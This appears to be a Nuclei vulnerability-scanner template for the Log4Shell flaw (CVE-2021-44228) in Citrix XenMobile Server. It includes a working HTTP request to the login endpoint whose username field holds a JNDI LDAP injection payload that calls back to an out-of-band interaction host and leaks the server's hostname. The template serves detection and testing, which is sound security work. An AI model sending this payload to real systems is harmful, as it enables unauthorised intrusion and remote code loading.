# Nuclei Template: Citrix XenMobile Server - Remote Code Execution (Apache Log4j)
**Template ID:** xenmobile-server-log4j-rce
**Vulnerability Class:** Deserialization of Untrusted Data
**Severity:** Critical
**CWE:** CWE-502
**Source:** Nuclei Template (`xenmobile-server-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
XenMobile Server is an on-premises enterprise mobility management solution and versions 10.14 RP2, 10.13 RP5 and 10.12 RP10 are vulnerable to CVE-2021-44228 (Apache Log4j). JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /zdm/cxf/login HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}
Referer: {{BaseURL}}/zdm/login_xdm_uc.jsp

login=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&password=admin
```

## References
- https://support.citrix.com/article/CTX335705/citrix-security-advisory-for-cve202144228-cve202145046-cve202145105-and-cve202144832
